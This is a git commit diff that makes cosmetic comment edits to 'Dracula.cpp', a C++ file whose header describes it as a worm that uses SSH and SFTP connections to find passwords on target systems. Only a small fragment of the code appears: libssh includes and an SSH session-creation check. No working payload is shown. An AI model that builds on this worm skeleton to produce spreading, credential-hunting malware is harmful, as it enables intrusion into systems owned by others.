b9e96233c21f1f8f5235cbf460d91e1af15cb747
apocalypse9949 <125962989+apocalypse9949@users.noreply.github.com>
2024-09-27 17:12:09 +0530

    Update Dracula.cpp

--- Dracula.cpp
+++ Dracula.cpp
@@ -1,8 +1,8 @@
-//Start Date : 24-09-2024
+//Start Date: 24-09-2024
 //author - apocalypse9949(me)
-//description - WORM using sftp and ssh connection for password finding in (any)OS but (tails os or tor based OS)
+//description - WORM using sftp and SSH connection for password finding in (any)OS but (tails os or tor-based OS)
 //WARNING!!
-
+//
 #include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
 #include <libssh/sftp.h>    //Tthe SFTP library for file transfer.
 #include <iostream>         // For input-output operations
@@ -19,7 +19,7 @@ public:
     // Constructor to initialize the network address
     Worm(const std::string& network_address) : network(network_address) {}
                 my_ssh_session = ssh_new();  // Create new SSH session
-                if (my_ssh_session == NULL) {  // Check if session creation was successful
+                if (my_ssh_session == NULL) {  // it will Check if session creation was successful
                     continue;
                 }   
 
